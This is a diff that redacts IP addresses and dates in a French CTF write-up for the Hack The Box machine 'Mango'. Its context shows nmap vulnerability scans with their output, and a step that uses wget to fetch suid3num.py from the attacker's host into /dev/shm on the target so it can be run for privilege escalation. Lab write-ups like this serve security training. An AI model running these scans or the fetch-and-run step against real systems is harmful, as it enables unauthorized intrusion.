@@ -51,7 +51,7 @@ ctf:
   target_ip: "10.129.x.x"
   skills: ["Enumeration","VirtualHost","NoSQL Injection","Credential Extraction","SSH","SUID","Privilege Escalation"]
   time_spent: "Plusieurs sessions"
-  # vpn_ip: "10.10.14.xx"
+  # vpn_ip: "14.10.10.xx"
   # notes: "Points d'attention…"
 
 # --- Options diverses ---
@@ -204,7 +204,7 @@ Les résultats sont enregistrés dans (`scans_nmap/mango/aggressive_vuln_scan.tx
     nmap -Pn -A -sV -p"22,80,443" --script="(http-vuln-* or http-shellshock or ssl-heartbleed or ssl-cert) and not (http-vuln-cve2017-1001000 or http-sql-injection or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 "mango.htb"
 
 # Nmap 7.99 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -A -sV -p22,80,443 "--script=(http-vuln-* or http-shellshock or ssl-heartbleed or ssl-cert) and not (http-vuln-cve2017-1001000 or http-sql-injection or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 -oN scans_nmap/mango/aggressive_vuln_scan_raw.txt mango.htb
-Nmap scan report for mango.htb (10.129.229.185)
+Nmap scan report for mango.htb (10.129.x.x)
 Host is up (0.0078s latency).
 
 PORT    STATE SERVICE  VERSION
@@ -229,12 +229,12 @@ Running: Linux 3.X|4.X
 OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
 OS details: Linux 3.2 - 4.14
 Network Distance: 2 hops
-Service Info: Host: 10.129.229.185; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Service Info: Host: 10.129.x.x; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 TRACEROUTE (using port 80/tcp)
 HOP RTT     ADDRESS
-1   7.15 ms 10.10.14.1
-2   7.90 ms mango.htb (10.129.229.185)
+1   7.15 ms 10.10.x.1
+2   7.90 ms mango.htb (10.129.x.x)
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at [date] -- 1 IP address (1 host up) scanned in 20.29 seconds
@@ -256,7 +256,7 @@ PORT    STATE SERVICE  VERSION
 22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 80/tcp  open  http     Apache httpd 2.4.29
 | http-headers: 
-|   Date: Tue, 11 Aug 2026 14:34:45 GMT
+|   Date: [date]
 |   Server: Apache/2.4.29 (Ubuntu)
 |   Content-Length: 274
 |   Connection: close
@@ -282,7 +282,7 @@ PORT    STATE SERVICE  VERSION
 |_http-title: Mango | Search Base
 |_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
 | http-headers: 
-|   Date: Tue, 11 Aug 2026 14:34:45 GMT
+|   Date: [date]
 |   Server: Apache/2.4.29 (Ubuntu)
 |   Connection: close
 |   Content-Type: text/html; charset=UTF-8
@@ -297,7 +297,7 @@ PORT    STATE SERVICE  VERSION
 |     Dir: /
 |   Total files found (by extension):
 |_    Other: 1; php: 1
-Service Info: Host: 10.129.229.185; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Service Info: Host: 10.129.x.x; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at [date] -- 1 IP address (1 host up) scanned in 18.09 seconds
@@ -313,7 +313,7 @@ Le script lance également un scan UDP rapide afin de détecter d’éventuels s
 ```bash
 # Nmap 7.99 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -n -Pn -sU --top-ports 20 -T4 -oN scans_nmap/mango/udp_vuln_scan.txt mango.htb
 Warning: 10.129.x.x giving up on port because retransmission cap hit (6).
-Nmap scan report for mango.htb (10.129.229.185)
+Nmap scan report for mango.htb (10.129.x.x)
 Host is up (0.0073s latency).
 
 PORT      STATE         SERVICE
@@ -1195,7 +1195,7 @@ Depuis la machine cible, télécharge ensuite `suid3num.py` dans `/dev/shm` :
 
 ```bash
 cd /dev/shm
-wget http://10.10.15.96:8000/suid3num.py
+wget http://10.10.x.x:8000/suid3num.py
 ```
 
 Puis exécute le script :
